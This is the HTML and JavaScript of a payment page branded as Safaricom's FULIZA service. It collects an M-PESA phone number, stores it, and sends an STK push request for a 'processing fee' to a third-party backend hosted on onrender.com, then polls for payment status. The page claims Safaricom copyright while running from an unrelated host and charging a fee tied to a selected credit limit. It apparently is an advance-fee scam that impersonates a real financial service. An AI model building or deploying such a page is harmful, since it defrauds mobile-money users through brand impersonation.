<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Processing fee  Payment</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    min-height:100vh;
    background:#E8F7EF;
    font-family:'Mali',cursive;
    color:#006B3F;
}

.container{
    width:92%;
    max-width:480px;
    margin:auto;
}

header{
    background:#00A651;
    color:#fff;
    padding:22px 0;
    border-bottom:1px solid #00A651;
    text-align:center;
}

.logo{
    font-size:25px;
    font-weight:700;
    color:#fff;
}

.brand{
    margin-top:4px;
    font-size:13px;
    opacity:.9;
}

.card{
    background:#fff;
    margin-top:24px;
    padding:22px 18px 18px;
    border-radius:14px;
    box-shadow:0 3px 12px rgba(0,107,63,.08);
    border:1px solid #B7E5CC;
}

h1{
    color:#fff;
    background:#00A651;
    padding:12px 8px;
    border-radius:10px;
    font-size:22px;
    font-weight:700;
    text-align:center;
    margin:2px 0 16px;
    line-height:1.3;
}

.subtitle{
    background:#E8F7EF;
    color:#000;
    padding:14px 12px;
    border-radius:12px;
    font-family:Arial,sans-serif;
    font-size:14px;
    line-height:1.5;
    text-align:center;
    margin-bottom:15px;
    border:1px solid #B7E5CC;
}

.summary{
    background:#fff;
    border-radius:13px;
    padding:15px;
    margin-bottom:15px;
    border:1px solid #B7E5CC;
}

.row{
    display:flex;
    justify-content:space-between;
    padding:9px 0;
    font-size:14px;
}

.row + .row{
    border-top:1px solid #B7E5CC;
}

.label{
    color:#000;
}

.value{
    font-weight:700;
    color:#000;
}

label{
    display:block;
    font-size:14px;
    font-weight:600;
    margin-bottom:7px;
    color:#006B3F;
}

input{
    width:100%;
    padding:14px;
    border:1px solid #B7E5CC;
    border-radius:10px;
    font-family:Arial,sans-serif;
    font-size:15px;
    outline:none;
    margin-bottom:17px;
    background:#fff;
    color:#000;
}

input::placeholder{
    color:#999;
}

input:focus{
    border-color:#00A651;
}

.btn{
    width:100%;
    padding:15px;
    border:0;
    border-radius:12px;
    background:#00A651;
    color:#fff;
    font-family:'Mali',cursive;
    font-size:20px;
    font-weight:600;
    cursor:pointer;
    box-shadow:0 3px 10px rgba(0,166,81,.20);
}

.message{
    min-height:22px;
    margin-top:12px;
    color:#006B3F;
    font-family:Arial,sans-serif;
    font-size:13px;
    line-height:1.5;
    text-align:center;
}

.notice{
    margin-top:15px;
    padding:12px;
    background:#E8F7EF;
    border:1px solid #B7E5CC;
    border-radius:9px;
    color:#000;
    font-family:Arial,sans-serif;
    font-size:12px;
    line-height:1.5;
}

footer{
    text-align:center;
    padding:15px 10px;
    color:#006B3F;
    background:transparent;
    font-family:Arial,sans-serif;
    font-size:12px;
    line-height:1.7;
}

footer a{
    color:#006B3F;
    text-decoration:none;
}

@media(max-width:360px){
    .card{
        padding:18px 13px 15px;
        border-radius:14px;
    }

    h1{
        font-size:20px;
    }

    .btn{
        padding:14px;
        font-size:18px;
    }
}
</style>
</head>

<body>

<header>
    <div class="container">
        <div class="logo">FULIZA</div>
        <div class="brand"></div>
    </div>
</header>

<main class="container">

    <section class="card">

        <h1>Processing fee Payment</h1>

        <p class="subtitle">
             complete the
            payment using your M-PESA phone number.
        </p>

        <div class="summary">

            <div class="row">
                <span class="label">Selected processing fee </span>

                <span class="value" id="selectedService">
                    —
                </span>
            </div>

            <div class="row">
                <span class="label">processing Fee</span>

                <span class="value" id="serviceFee">
                    —
                </span>
            </div>

        </div>

        <form id="paymentForm">

            <label for="phone">
                M-PESA Phone Number
            </label>

            <input
                type="tel"
                id="phone"
                placeholder="07XXXXXXXX"
                inputmode="numeric"
                autocomplete="tel"
                maxlength="10"
                required
            >

            <button
                type="submit"
                class="btn"
                id="paymentBtn"
            >
                Pay Processing Fee
            </button>

        </form>

        <div
            class="message"
            id="paymentMessage">
        </div>

        <div class="notice">
            
        </div>

    </section>

</main>

<footer>

    <a href="#">Terms &amp; Conditions</a> |
    <a href="#">Privacy Policy</a> |
    <a href="#">Support</a>

    <br>

    © 2026 Safaricom PLC. All rights reserved.

</footer>

<script>

const selectedServiceElement =
    document.getElementById("selectedService");

const serviceFeeElement =
    document.getElementById("serviceFee");

const paymentForm =
    document.getElementById("paymentForm");

const paymentBtn =
    document.getElementById("paymentBtn");

const phoneInput =
    document.getElementById("phone");

const paymentMessage =
    document.getElementById("paymentMessage");


/*
 * Values saved by amount.html
 */
const selectedLimit =
    sessionStorage.getItem("selectedLimit");

const serviceFee =
    sessionStorage.getItem("serviceFee");


/*
 * Make sure a service selection exists.
 */
if(!selectedLimit || !serviceFee){

    selectedServiceElement.textContent =
        "Not selected";

    serviceFeeElement.textContent =
        "Not available";

    paymentBtn.disabled = true;

    paymentMessage.textContent =
        "No service selection was found.";

    setTimeout(() => {
        window.location.href =
            "amount.html";
    }, 1500);

}else{

    selectedServiceElement.textContent =
        "KSh " +
        Number(selectedLimit).toLocaleString();

    serviceFeeElement.textContent =
        "KSh " +
        Number(serviceFee).toLocaleString();

}


/*
 * Convert Kenyan phone number to
 * Paylor-compatible 254 format.
 */
function normalizePhone(phone){

    phone = String(phone)
        .replace(/\s+/g, "");

    if(phone.startsWith("0")){
        phone =
            "254" +
            phone.substring(1);
    }

    if(phone.startsWith("+254")){
        phone =
            phone.substring(1);
    }

    return phone;
}


/*
 * Submit payment.
 */
paymentForm.addEventListener(
    "submit",
    async function(event){

        event.preventDefault();

        const enteredPhone =
            phoneInput.value.trim();

        const phonePattern =
            /^(07|01)\d{8}$/;

        if(!phonePattern.test(
            enteredPhone
        )){

            alert(
                "Please enter a valid Kenyan phone number."
            );

            phoneInput.focus();

            return;
        }


        const phone =
            normalizePhone(
                enteredPhone
            );


        localStorage.setItem(
    "paymentPhone",
    enteredPhone
); 


        paymentBtn.textContent =
            "Sending STK Push...";

        paymentBtn.disabled = true;

        paymentMessage.textContent =
            "Please wait while we send the M-PESA payment request.";


        try{
console.log("AMOUNT BEING SENT:", Number(serviceFee));
            const response =
                await fetch(
    "https://fuliza-backend-1.onrender.com/stk-push",
    {
                        method:"POST",

                        headers:{
                            "Content-Type":
                                "application/json"
                        },

                        body:JSON.stringify({

                            phone:phone,

                            amount:
                                Number(serviceFee)

                        })
                    }
                );


            const data =
                await response.json();


            console.log(
                "STK RESPONSE:",
                data
            );


            if(
                !response.ok ||
                !data.success
            ){

                throw new Error(
                    data.message ||
                    "STK Push failed."
                );

            }


            /*
             * Your backend returns
             * transactionId.
             */
            const transactionId =
                data.transactionId ||
                data.checkout_request_id;


            if(!transactionId){

                throw new Error(
                    "No Paylor transaction ID received."
                );

            }


            paymentBtn.textContent =
                "Processing...";


            paymentMessage.textContent =
                "An M-PESA payment request has been sent to your phone. Enter your M-PESA PIN to complete the payment.";


            checkPayment(
                transactionId
            );


        }catch(error){

            console.log(
                "PAYMENT ERROR:",
                error
            );


            paymentMessage.textContent =
                error.message ||
                "Payment request failed.";


            paymentBtn.textContent =
                "Pay Service Fee";

            paymentBtn.disabled =
                false;

        }

    }
);


/*
 * Check Paylor transaction status.
 */
async function checkPayment(
    transactionId
){

    let attempts = 0;

    const maxAttempts = 40;


    const interval =
        setInterval(
            async () => {

                attempts++;


                if(
                    attempts >
                    maxAttempts
                ){

                    clearInterval(
                        interval
                    );

                    paymentMessage.textContent =
                        "Payment confirmation is taking longer than expected. Please check your M-PESA messages before trying again.";

                    paymentBtn.textContent =
                        "Pay Service Fee";

                    paymentBtn.disabled =
                        false;

                    return;

                }


                try{

                    const response =
                        await fetch(
    "https://fuliza-backend-1.onrender.com/payment-status",
    {
                                method:"POST",

                                headers:{
                                    "Content-Type":
                                        "application/json"
                                },

                                body:JSON.stringify({
                                    transactionId:
                                        transactionId
                                })
                            }
                        );


                    const result =
                        await response.json();


                    console.log(
                        "PAYMENT STATUS:",
                        result
                    );


                    if(!result.success){
                        return;
                    }


                    /*
                     * Your backend already normalizes
                     * the status into result.status.
                     */
                    const status =
                        String(
                            result.status ||
                            result.data?.status ||
                            ""
                        ).toUpperCase();


                    if(
                        status ===
                        "COMPLETED"
                    ){

                        clearInterval(
                            interval
                        );


                        paymentMessage.textContent =
                            "Payment successful. Redirecting...";


                        /*
                         * Change this to your legitimate
                         * next page when ready.
                         */
                        window.location.href = "delivery.html";

                    }


                    else if(
                        status ===
                        "FAILED" ||
                        status ===
                        "CANCELLED"
                    ){

                        clearInterval(
                            interval
                        );


                        paymentMessage.textContent =
                            "Payment " +
                            status.toLowerCase() +
                            ".";


                        paymentBtn.textContent =
                            "Pay Service Fee";

                        paymentBtn.disabled =
                            false;

                    }

                }catch(error){

                    console.log(
                        "STATUS ERROR:",
                        error
                    );

                }

            },
            3000
        );

}

</script>

</body>
</html>
